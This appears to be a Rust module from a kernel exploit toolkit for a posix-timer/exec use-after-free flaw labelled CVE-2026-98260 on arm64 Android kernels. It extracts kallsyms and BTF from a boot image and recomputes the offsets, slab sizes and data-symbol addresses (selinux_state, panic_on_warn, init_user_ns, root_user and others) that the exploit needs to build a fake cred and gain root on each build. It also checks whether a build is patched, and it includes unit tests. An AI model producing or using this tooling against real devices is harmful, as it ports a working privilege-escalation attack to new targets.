//! CVE-2026-98260 per-build derivation.
//!
//! Everything the exploit hardcodes is recomputed here from a `boot.img` /
//! arm64 `Image`:
//!
//! * the two tracepoint call sites (`do_timer_create+0x94`,
//!   `copy_process`'s `task_struct_cachep` allocation) that `timer.c` matches
//!   with `& 0x1fffff`,
//! * the six link-time data symbols copied into the fake cred,
//! * the BTF struct layout / slab sizes behind `OFF_TASK_CRED`, `CRED_REQ`,
//!   `CRED_ALLOC`, `TIMER_ALLOC`, `TASK_ALLOC_BYTES`,
//! * whether the vulnerable exec/posix-timer ordering
//!   (`begin_new_exec()` cleans the timerqueue only after the fallible
//!   operations) is still present.

use std::collections::{BTreeMap, HashMap};
use std::path::Path;
use std::sync::LazyLock;

use regex::Regex;

use crate::boot::BootImage;
use crate::btf::Btf;
use crate::disasm::disassemble_range;
use crate::error::{ExtractError, Result};
use crate::kallsyms::{self, Kallsyms};
use crate::kallsyms_finder;

/// `timer.c` masks the leaked trace call site with `& 0x1fffff`.
pub const LOW21_MASK: u64 = 0x1f_ffff;
/// arm64 GKI data cache line: SLUB rounds `SLAB_HWCACHE_ALIGN` caches to it
/// (`cred_jar` in kernel/cred.c, `task_struct_cachep` in kernel/fork.c).
pub const CACHE_LINE: u64 = 64;
/// Upper bound for one disassembled range, matching `disasm`'s own cap.
const MAX_FUNC: u64 = 0x20_000;

/// Function bodies whose behaviour decides exploitability.
const TIMER_CLEANUP_CALLS: &[&str] = &[
    "posix_cpu_timers_exit",
    "exit_itimers",
    "flush_itimer_signals",
];
/// The operations that may fail between `de_thread()` and the timer cleanup.
const FALLIBLE_CALLS: &[&str] = &["unshare_files", "set_mm_exe_file", "exec_task_namespaces"];

/// `timer.c` macro name -> kernel data symbol.
const DATA_SYMBOLS: &[(&str, &str)] = &[
    ("SELINUX_STATE_STATIC", "selinux_state"),
    ("PANIC_ON_WARN_STATIC", "panic_on_warn"),
    ("ROOT_USER_STATIC", "root_user"),
    ("INIT_USER_NS_STATIC", "init_user_ns"),
    ("INIT_UCOUNTS_STATIC", "init_ucounts"),
    ("INIT_GROUPS_STATIC", "init_groups"),
];

// ---------------------------------------------------------------------------
// instruction text helpers
// ---------------------------------------------------------------------------

static RE_BL: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)^bl\s+0x([0-9a-f]+)$").unwrap());

static RE_UNCOND_B: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)^b\s+0x([0-9a-f]+)$").unwrap());

static RE_CBZ: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)^(cbz|cbnz)\s+\S+,\s*0x([0-9a-f]+)$").unwrap());

static RE_ADRP: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)^adrp\s+x(\d+),\s*0x([0-9a-f]+)$").unwrap());

static RE_LDR_X: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)^ldr\s+x(\d+),\s*\[x(\d+)(?:,\s*#(0x[0-9a-f]+))?\]$").unwrap()
});

static RE_ADD_X: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)^add\s+x(\d+),\s*x(\d+),\s*#(0x[0-9a-f]+)$").unwrap());

/// Hex literal from an instruction operand or a `#define`, with or without
/// the `0x` prefix that the individual capture groups may or may not keep.
fn hex(text: &str) -> Option<u64> {
    let trimmed = text.trim();
    let digits = trimmed
        .strip_prefix("0x")
        .or_else(|| trimmed.strip_prefix("0X"))
        .unwrap_or(trimmed);
    if digits.is_empty() {
        return None;
    }
    u64::from_str_radix(digits, 16).ok()
}

/// A disassembled range: `lines[i]` sits at `start + 4*i` (arm64 is fixed width).
pub struct Code {
    pub start: u64,
    pub lines: Vec<String>,
}

impl Code {
    pub fn addr(&self, index: usize) -> u64 {
        self.start + index as u64 * 4
    }

    pub fn index_of(&self, addr: u64) -> Option<usize> {
        if addr < self.start || addr >= self.addr(self.lines.len()) || (addr - self.start) % 4 != 0
        {
            return None;
        }
        Some(((addr - self.start) / 4) as usize)
    }

    pub fn end(&self) -> u64 {
        self.addr(self.lines.len())
    }

    /// `bl` targets in program order, as `(index, target)`.
    pub fn calls(&self) -> Vec<(usize, u64)> {
        let mut out = Vec::new();
        for (index, line) in self.lines.iter().enumerate() {
            if let Some(caps) = RE_BL.captures(line) {
                if let Some(target) = hex(&caps[1]) {
                    out.push((index, target));
                }
            }
        }
        out
    }

    fn call_target(&self, index: usize) -> Option<u64> {
        RE_BL
            .captures(&self.lines[index])
            .and_then(|caps| hex(&caps[1]))
    }
}

pub fn disassemble_function(kernel: &[u8], start: u64, end: u64) -> Result<Code> {
    let stop = end.min(start.saturating_add(MAX_FUNC));
    if stop <= start {
        return Err(ExtractError::new(format!(
            "function at 0x{start:x} has no extent (next symbol 0x{end:x})"
        )));
    }
    let lines = disassemble_range(kernel, start as usize, stop as usize)?;
    if lines.is_empty() {
        return Err(ExtractError::new(format!("no instructions at 0x{start:x}")));
    }
    Ok(Code { start, lines })
}

// ---------------------------------------------------------------------------
// symbols
// ---------------------------------------------------------------------------

/// Link-time symbols rebased onto `_text`, so every address we derive is a
/// file offset inside the uncompressed Image and can be turned back into a
/// runtime address with `text_base + offset`.
pub struct Symbols {
    text_base: u64,
    table: BTreeMap<String, u64>,
    sorted: Vec<u64>,
}

impl Symbols {
    pub fn new(ks: &Kallsyms) -> Result<Self> {
        let text_base = kallsyms::unique(&ks.symbols, "_text")
            .ok_or_else(|| ExtractError::new("kallsyms has no unique _text"))?;
        let mut table = BTreeMap::new();
        for (name, values) in &ks.symbols {
            if values.len() == 1 {
                table.insert(
                    name.clone(),
                    (*values.iter().next().unwrap()).wrapping_sub(text_base),
                );
            }
        }
        let mut sorted: Vec<u64> = table.values().copied().collect();
        sorted.sort_unstable();
        sorted.dedup();
        Ok(Self {
            text_base,
            table,
            sorted,
        })
    }

    pub fn text_base(&self) -> u64 {
        self.text_base
    }

    pub fn rel(&self, name: &str) -> Option<u64> {
        self.table.get(name).copied()
    }

    pub fn require(&self, name: &str) -> Result<u64> {
        self.rel(name)
            .ok_or_else(|| ExtractError::new(format!("kallsyms has no unique symbol {name}")))
    }

    pub fn abs(&self, rel: u64) -> u64 {
        self.text_base.wrapping_add(rel)
    }

    /// End of the symbol's extent: the next symbol, capped at `MAX_FUNC`.
    pub fn extent(&self, rel: u64) -> u64 {
        let next = self
            .sorted
            .iter()
            .copied()
            .find(|&candidate| candidate > rel)
            .unwrap_or(rel + MAX_FUNC);
        next.min(rel.saturating_add(MAX_FUNC))
    }
}

// ---------------------------------------------------------------------------
// tracepoint call sites
// ---------------------------------------------------------------------------

/// Locate `kmem_cache_alloc*(cachep, ...)` inside one function and return the
/// recorded call site (`bl` address + 4).
///
/// The kernel loads the cache pointer, sets the gfp argument, then calls the
/// allocator; we track `adrp`/`add`/`ldr` to recognise the exact cache and take
/// the next `bl` as the allocation.
pub fn find_cache_alloc_site(code: &Code, cachep: u64, alloc_fns: &[u64]) -> Option<u64> {
    let mut adrp: HashMap<u8, u64> = HashMap::new();
    let mut loaded: HashMap<u8, u64> = HashMap::new();
    let mut pending: Option<u8> = None;

    for (index, line) in code.lines.iter().enumerate() {
        if let Some(caps) = RE_ADRP.captures(line) {
            let reg: u8 = caps[1].parse().ok()?;
            adrp.insert(reg, hex(&caps[2])?);
            continue;
        }
        if let Some(caps) = RE_ADD_X.captures(line) {
            let dst: u8 = caps[1].parse().ok()?;
            let src: u8 = caps[2].parse().ok()?;
            if let Some(base) = loaded.get(&src).or_else(|| adrp.get(&src)) {
                loaded.insert(dst, base + hex(&caps[3])?);
            }
            continue;
        }
        if let Some(caps) = RE_LDR_X.captures(line) {
            let dst: u8 = caps[1].parse().ok()?;
            let src: u8 = caps[2].parse().ok()?;
            let imm = caps.get(3).and_then(|m| hex(m.as_str())).unwrap_or(0);
            if let Some(base) = loaded.get(&src).or_else(|| adrp.get(&src)) {
                let value = base + imm;
                if value == cachep {
                    pending = Some(dst);
                }
            }
            continue;
        }
        if let Some(target) = code.call_target(index) {
            if pending.is_some() {
                if alloc_fns.contains(&target) {
                    return Some(code.addr(index) + 4);
                }
                pending = None;
            }
        }
    }
    None
}

// ---------------------------------------------------------------------------
// vulnerability checks
// ---------------------------------------------------------------------------

#[derive(Debug, Clone)]
pub struct ExecOrder {
    /// Calls to the tracked functions, in program order.
    pub calls: Vec<(String, u64)>,
    /// True when the POSIX timer cleanup runs before `unshare_files()`.
    pub cleanup_first: bool,
}

/// Fixed kernels clean the timerqueue right after `de_thread()`
/// (upstream commit acb03d388181, stable d9ae467e617c); vulnerable kernels do
/// it after `exec_task_namespaces()`.
pub fn check_exec_timer_order(code: &Code, syms: &Symbols) -> ExecOrder {
    let mut tracked: HashMap<u64, String> = HashMap::new();
    for name in TIMER_CLEANUP_CALLS.iter().chain(FALLIBLE_CALLS) {
        if let Some(rel) = syms.rel(name) {
            tracked.insert(rel, (*name).to_string());
        }
    }
    let mut calls = Vec::new();
    for (index, target) in code.calls() {
        if let Some(name) = tracked.get(&target) {
            calls.push((name.clone(), code.addr(index)));
        }
    }
    let cleanup = calls
        .iter()
        .position(|(name, _)| TIMER_CLEANUP_CALLS.contains(&name.as_str()));
    let fallible = calls
        .iter()
        .position(|(name, _)| FALLIBLE_CALLS.contains(&name.as_str()));
    let cleanup_first = match (cleanup, fallible) {
        (Some(cleanup), Some(fallible)) => cleanup < fallible,
        _ => false,
    };
    ExecOrder {
        calls,
        cleanup_first,
    }
}

#[derive(Debug, Clone)]
pub struct TimerDelCheck {
    /// `pid_task()` returning NULL leaves the node queued when this is true.
    pub leaves_node_queued: bool,
    /// Target of the NULL branch taken after `pid_task()`.
    pub null_path: u64,
    /// Whether that path dequeues the timer node.
    pub dequeues: bool,
}

/// `posix_cpu_timer_del()`: on `pid_task() == NULL` the vulnerable code jumps
/// straight to the `put_pid()` exit, leaving `cpu_timer.node` linked.
pub fn check_posix_cpu_timer_del(
    code: &Code,
    pid_task: u64,
    timerqueue_del: Option<u64>,
    unlock: Option<u64>,
) -> Option<TimerDelCheck> {
    let call = code
        .calls()
        .into_iter()
        .find(|&(_, target)| target == pid_task)?;
    let branch_index = call.0 + 1;
    let branch = code.lines.get(branch_index)?;
    let caps = RE_CBZ.captures(branch)?;
    let is_null_branch = caps[1].eq_ignore_ascii_case("cbz");
    let target = hex(&caps[2])?;
    let null_path = if is_null_branch {
        target
    } else {
        code.addr(branch_index + 1)
    };

    let mut index = code.index_of(null_path)?;
    let mut hops = 0;
    let mut dequeues = false;
    while index < code.lines.len() {
        if let Some(target) = code.call_target(index) {
            if Some(target) == timerqueue_del {
                dequeues = true;
                break;
            }
            if Some(target) == unlock {
                break;
            }
        } else if code.lines[index].starts_with("ret") {
            break;
        } else if let Some(caps) = RE_UNCOND_B.captures(&code.lines[index]) {
            hops += 1;
            if hops > 8 {
                break;
            }
            index = hex(&caps[1]).and_then(|addr| code.index_of(addr))?;
            continue;
        }
        index += 1;
    }
    Some(TimerDelCheck {
        leaves_node_queued: !dequeues,
        null_path,
        dequeues,
    })
}

// ---------------------------------------------------------------------------
// layout / sizes
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy)]
pub struct Layout {
    pub task_cred: u32,
    pub cred_uid: u32,
    pub sizeof_task: u32,
    pub sizeof_cred: u32,
    pub sizeof_kitimer: u32,
}

#[derive(Debug, Clone, Copy)]
pub struct Sizes {
    /// `posix_timers_cache`: `k_itimer` size, no `SLAB_HWCACHE_ALIGN`.
    pub timer_alloc: u64,
    /// `cred_jar`: requested size (`sizeof(struct cred)`).
    pub cred_req: u64,
    /// `cred_jar`: SLUB size, rounded to the data cache line.
    pub cred_alloc: u64,
    /// `task_struct_cachep`: requested size (`sizeof(struct task_struct)`).
    pub task_bytes: u64,
}

fn align_up(value: u64, align: u64) -> u64 {
    if align == 0 {
        return value;
    }
    value.div_ceil(align) * align
}

/// SLUB size of `SLAB_HWCACHE_ALIGN` caches on arm64 GKI.
pub fn hwcache_size(size: u64) -> u64 {
    align_up(size, CACHE_LINE)
}

/// Size of a cache built without `SLAB_HWCACHE_ALIGN` (word alignment).
pub fn plain_cache_size(size: u64) -> u64 {
    align_up(size, 8)
}

// ---------------------------------------------------------------------------
// derived facts
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy)]
pub struct TraceSites {
    pub timer_site: u64,
    pub copy_process_site: u64,
}

impl TraceSites {
    pub fn timer_low21(self) -> u64 {
        self.timer_site & LOW21_MASK
    }

    pub fn copy_process_low21(self) -> u64 {
        self.copy_process_site & LOW21_MASK
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Verdict {
    /// Root cause present; the shipped binary runs only if every constant matches.
    Vulnerable,
    /// Upstream fix (`posixtimer_exec` right after `de_thread`) is present.
    Patched,
}

#[derive(Debug)]
pub struct Facts {
    pub release: Option<String>,
    pub text_base: u64,
    pub sites: TraceSites,
    /// Macro name -> absolute link-time address.
    pub data_symbols: BTreeMap<String, u64>,
    pub layout: Layout,
    pub sizes: Sizes,
    pub order: ExecOrder,
    pub del: TimerDelCheck,
    pub verdict: Verdict,
}

pub fn derive(image: &Path) -> Result<Facts> {
    let boot = BootImage::load(image)?;
    let btf_blob = boot.embedded_btf_at();
    let btf_at = btf_blob
        .as_ref()
        .map(|(offset, blob)| (*offset, blob.len()));
    let ks = kallsyms_finder::recover(&boot.kernel, btf_at)?;
    let syms = Symbols::new(&ks)?;
    let btf = btf_blob
        .as_ref()
        .map(|(_, blob)| Btf::new(blob))
        .transpose()?;

    // --- trace sites -------------------------------------------------------
    let timer_function = syms.require("do_timer_create")?;
    let timer_code =
        disassemble_function(&boot.kernel, timer_function, syms.extent(timer_function))?;
    let posix_timers_cache = syms.require("posix_timers_cache")?;
    let timer_alloc_fns: Vec<u64> = ["kmem_cache_alloc_noprof", "kmem_cache_alloc"]
        .iter()
        .filter_map(|name| syms.rel(name))
        .collect();
    let timer_site = find_cache_alloc_site(&timer_code, posix_timers_cache, &timer_alloc_fns);

    let copy_process_function = syms.require("copy_process")?;
    let copy_code = disassemble_function(
        &boot.kernel,
        copy_process_function,
        syms.extent(copy_process_function),
    )?;
    let task_struct_cachep = syms.require("task_struct_cachep")?;
    let task_alloc_fns: Vec<u64> = [
        "kmem_cache_alloc_node_noprof",
        "kmem_cache_alloc_node",
        "kmem_cache_alloc_noprof",
        "kmem_cache_alloc",
    ]
    .iter()
    .filter_map(|name| syms.rel(name))
    .collect();
    let task_site = find_cache_alloc_site(&copy_code, task_struct_cachep, &task_alloc_fns);

    let sites = TraceSites {
        timer_site: timer_site.ok_or_else(|| {
            ExtractError::new("do_timer_create: no kmem_cache_alloc(posix_timers_cache) call")
        })?,
        copy_process_site: task_site.ok_or_else(|| {
            ExtractError::new("copy_process: no kmem_cache_alloc(task_struct_cachep) call")
        })?,
    };

    // --- data symbols ------------------------------------------------------
    let mut data_symbols = BTreeMap::new();
    for (macro_name, symbol) in DATA_SYMBOLS {
        let rel = syms.require(symbol)?;
        data_symbols.insert((*macro_name).to_string(), syms.abs(rel));
    }

    // --- BTF layout --------------------------------------------------------
    let btf = btf.ok_or_else(|| ExtractError::new("kernel carries no embedded BTF"))?;
    let field = |structure: &str, member: &str| -> Result<u32> {
        btf.field(structure, member)
            .ok_or_else(|| ExtractError::new(format!("BTF has no {structure}.{member}")))
    };
    let size = |structure: &str| -> Result<u32> {
        btf.size(structure)
            .ok_or_else(|| ExtractError::new(format!("BTF has no struct {structure}")))
    };
    let layout = Layout {
        task_cred: field("task_struct", "cred")?,
        cred_uid: field("cred", "uid")?,
        sizeof_task: size("task_struct")?,
        sizeof_cred: size("cred")?,
        sizeof_kitimer: size("k_itimer")?,
    };
    let sizes = Sizes {
        timer_alloc: plain_cache_size(layout.sizeof_kitimer as u64),
        cred_req: layout.sizeof_cred as u64,
        cred_alloc: hwcache_size(layout.sizeof_cred as u64),
        task_bytes: layout.sizeof_task as u64,
    };

    // --- vulnerability state ----------------------------------------------
    let begin_new_exec = syms.require("begin_new_exec")?;
    let exec_code =
        disassemble_function(&boot.kernel, begin_new_exec, syms.extent(begin_new_exec))?;
    let order = check_exec_timer_order(&exec_code, &syms);

    let del_start = syms.require("posix_cpu_timer_del")?;
    let del_code = disassemble_function(&boot.kernel, del_start, syms.extent(del_start))?;
    let del = check_posix_cpu_timer_del(
        &del_code,
        syms.require("pid_task")?,
        syms.rel("timerqueue_del"),
        syms.rel("__rcu_read_unlock"),
    )
    .ok_or_else(|| {
        ExtractError::new("posix_cpu_timer_del: pid_task() call or NULL branch not recognised")
    })?;

    let verdict = if order.cleanup_first && !del.leaves_node_queued {
        Verdict::Patched
    } else {
        Verdict::Vulnerable
    };

    Ok(Facts {
        release: boot.release(),
        text_base: syms.text_base(),
        sites,
        data_symbols,
        layout,
        sizes,
        order,
        del,
        verdict,
    })
}

// ---------------------------------------------------------------------------
// tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    fn code(start: u64, lines: &[&str]) -> Code {
        Code {
            start,
            lines: lines.iter().map(|line| (*line).to_string()).collect(),
        }
    }

    fn symbols(pairs: &[(&str, u64)]) -> Symbols {
        let base = 0xffff_ffc0_8000_0000u64;
        let mut table = BTreeMap::new();
        table.insert("_text".to_string(), 0u64);
        for (name, rel) in pairs {
            table.insert((*name).to_string(), *rel);
        }
        let mut sorted: Vec<u64> = table.values().copied().collect();
        sorted.sort_unstable();
        sorted.dedup();
        Symbols {
            text_base: base,
            table,
            sorted,
        }
    }

    #[test]
    fn timer_site_is_the_allocator_return_address() {
        // do_timer_create+0x84..0x94 from a 6.12.69 Android image.
        let body = code(
            0x35_782c,
            &[
                "adrp x8, 0x285f000",
                "mov w1, #0xdc0",
                "ldr x0, [x8, #0x3f0]",
                "bl 0x1419dc",
                "mov x19, x0",
            ],
        );
        let site = find_cache_alloc_site(&body, 0x28_5f3f0, &[0x14_19dc]).unwrap();
        assert_eq!(site, 0x35_783c);
        assert_eq!(site & LOW21_MASK, 0x15_783c);
    }

    #[test]
    fn task_site_uses_the_node_allocator() {
        let body = code(
            0x0f_430c,
            &[
                "adrp x8, 0x2836000",
                "mov w1, #0xcc0",
                "mov w2, w26",
                "ldr x0, [x8, #0x6c8]",
                "bl 0x1415d8",
                "mov x20, x0",
            ],
        );
        let site = find_cache_alloc_site(&body, 0x28_366c8, &[0x14_15d8]).unwrap();
        assert_eq!(site, 0x0f_4320);
    }

    #[test]
    fn adrp_add_pairs_are_followed() {
        let body = code(
            0x1000,
            &[
                "adrp x9, 0x285f000",
                "add x9, x9, #0x3f0",
                "ldr x0, [x9]",
                "bl 0x100",
            ],
        );
        let site = find_cache_alloc_site(&body, 0x28_5f3f0, &[0x100]).unwrap();
        assert_eq!(site, 0x1010);
    }

    #[test]
    fn wrong_cache_never_matches() {
        let body = code(
            0x1000,
            &["adrp x8, 0x2836000", "ldr x0, [x8, #0x6c8]", "bl 0x100"],
        );
        assert!(find_cache_alloc_site(&body, 0x28_5f3f0, &[0x100]).is_none());
    }

    #[test]
    fn vulnerable_order_cleans_timers_after_task_namespaces() {
        let syms = symbols(&[
            ("unshare_files", 0x10),
            ("set_mm_exe_file", 0x20),
            ("exec_task_namespaces", 0x30),
            ("posix_cpu_timers_exit", 0x40),
            ("exit_itimers", 0x50),
            ("flush_itimer_signals", 0x60),
        ]);
        let body = code(
            0x1000,
            &[
                "bl 0x10", "bl 0x20", "bl 0x30", "bl 0x40", "bl 0x50", "bl 0x60",
            ],
        );
        let order = check_exec_timer_order(&body, &syms);
        assert!(!order.cleanup_first);
        assert_eq!(order.calls[0].0, "unshare_files");
        assert_eq!(order.calls[3].0, "posix_cpu_timers_exit");
    }

    #[test]
    fn fixed_order_cleans_timers_first() {
        let syms = symbols(&[
            ("unshare_files", 0x10),
            ("set_mm_exe_file", 0x20),
            ("exec_task_namespaces", 0x30),
            ("posix_cpu_timers_exit", 0x40),
            ("exit_itimers", 0x50),
        ]);
        let body = code(
            0x2000,
            &["bl 0x40", "bl 0x50", "bl 0x10", "bl 0x20", "bl 0x30"],
        );
        assert!(check_exec_timer_order(&body, &syms).cleanup_first);
    }

    #[test]
    fn null_pid_path_leaves_the_node_queued() {
        // posix_cpu_timer_del around the `pid_task() == NULL` branch.
        let body = code(
            0x5c_0528,
            &[
                "bl 0x9ffe4",
                "ldr x0, [x19, #0xa0]",
                "bl 0x10660c",
                "cbz x0, 0x5c056c",
                "bl 0x1dba1c",
                "cbnz w0, 0x5c052c",
                "bl 0xbaa2c",
                "ldr x0, [x19, #0x98]",
                "bl 0x12842c",
                "bl 0x12ac6b4",
                "ret",
                "dmb ishld",
                "ldr x8, [x19, #0x98]",
                "cbz x8, 0x5c0580",
                "brk #0x800",
                "b 0x5c058c",
                "ldr x8, [x21]",
                "cmp x8, x21",
                "b.ne 0x5c0578",
                "bl 0xbaa2c",
                "b 0x5c05f0",
            ],
        );
        let check =
            check_posix_cpu_timer_del(&body, 0x10_660c, Some(0x12_842c), Some(0x0b_aa2c)).unwrap();
        assert!(check.leaves_node_queued);
        assert_eq!(check.null_path, 0x5c_056c);
    }

    #[test]
    fn a_null_path_that_dequeues_is_not_vulnerable() {
        let body = code(
            0x1000,
            &[
                "bl 0x100",
                "cbz x0, 0x1014",
                "bl 0x200",
                "ret",
                "bl 0x300",
                "bl 0x400",
                "bl 0x300",
                "ret",
            ],
        );
        let check = check_posix_cpu_timer_del(&body, 0x100, Some(0x400), Some(0x300)).unwrap();
        assert!(!check.leaves_node_queued);
        assert!(check.dequeues);
        assert_eq!(check.null_path, 0x1014);
    }

    #[test]
    fn slab_sizes_follow_slub_rules() {
        // Values recorded on the first 6.12.69 target build.
        assert_eq!(plain_cache_size(0x100), 0x100);
        assert_eq!(hwcache_size(0xb8), 0xc0);
        assert_eq!(hwcache_size(0x1440), 0x1440);
    }

}

